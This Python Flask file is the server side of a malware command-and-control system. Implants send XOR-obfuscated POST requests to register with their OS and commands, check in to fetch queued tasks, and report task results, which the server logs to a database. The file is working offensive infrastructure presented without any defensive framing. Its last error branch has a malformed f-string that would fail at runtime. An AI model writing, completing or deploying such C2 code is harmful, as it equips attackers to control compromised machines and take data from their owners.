from flask import Blueprint, request
import json

from .database import Key
from . import agent

c2_routes = Blueprint('c2_routes', __name__)

def xor_data(key: str, data: str) -> str:
    xored = ''

    for i in range(len(data)):
        xored += chr(ord(data[i]) ^ ord(key[i % len(key)]))

    return(xored)

@c2_routes.route('/', defaults={'path': ''}, methods=['POST'])
@c2_routes.route('/<path:path>', methods=['POST'])
def c2_catchall(path: str):
    encrypted_data = request.data.decode('utf-8')

    found_key = False
    agent_key = ''
    data = None

    for key in Key.select():
        try:
            decrypted_data = xor_data(key.key, encrypted_data)
            data = json.loads(decrypted_data)
        except:
            continue

        found_key = True
        agent_key = str(key.key)
        break
        
    # Return empty response if no key is found
    if not found_key or not data:
        return('')
    
    if 'implant_id' not in data or 'ip' not in data or 'action' not in data:
        return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_INVALID) + ', "message": "requst must conain an `implant_id`, `ip`, and `action` keys"}'))

    # Agent action
    if data['action'] == agent.ACTION_REGISTER:
        if 'registration' not in data:
            return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_INVALID) + ', "message": "registration action request must include a `registration` key"}'))

        # Check if this agent is already registered
        if agent.is_agent(data['implant_id'], data['ip']):
            return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_CONTINUE) + ', "message": "already registered"}'))

        # Validate commands
        if not agent.validate_commands(data['registration']['commands']):
            return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_INVALID) + ', "message": "invalid commands"}'))

        agent.create_agent(data['implant_id'], data['ip'], data['registration']['os'], data['registration']['commands'])

        agent_id = agent.get_agent_id(data['implant_id'], data['ip'])
        agent.update_last_checkin(agent_id)

        return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_CONTINUE) + '}'))

    elif data['action'] == agent.ACTION_CHECKIN:
        if not agent.is_agent(data['implant_id'], data['ip']):
            return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_REGISTER) + '}'))

        agent_id = agent.get_agent_id(data['implant_id'], data['ip'])
        agent.update_last_checkin(agent_id)

        if agent_id == None:
            return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_ERROR) + ', "message": "something went wrong"}'))

        active_tasks = agent.get_active_tasks(agent_id)

        # If there aren't any tasks, just continue
        if len(active_tasks) == 0:
            return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_CONTINUE) + '}'))

        # Mark the tasks sent
        for task in active_tasks:
            agent.mark_task_sent(task['task_id'])

        return(xor_data(agent_key, '{"status": ' + json.dumps(agent.STATUS_TASKS) + ', "tasks": ' + json.dumps(active_tasks) + '}'))

    elif data['action'] == agent.ACTION_TASK_RESULT:
        if not agent.is_agent(data['implant_id'], data['ip']):
            return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_REGISTER) + '}'))

        agent_id = agent.get_agent_id(data['implant_id'], data['ip'])
        agent.update_last_checkin(agent_id)

        if 'result' not in data:
            return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_INVALID) + ', "message": "task result action request must include a `result` key"}'))
        
        # Validate the result
        if 'task_id' not in data['result'] or 'result' not in data['result']:
            return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_INVALID) + ', "message": "task result must contain a `task_id` and `result` key"}'))

        # Log the result to the database
        agent.log_task_result(data['result']['task_id'], data['result']['result'])

        return(xor_data(agent_key, '{"status": ' + str(agent.STATUS_CONTINUE) + '}'))

    else:
        return(xor_data(agent_key, f'{"status": {agent.STATUS_INVALID}, "message": "invalid action"}'))
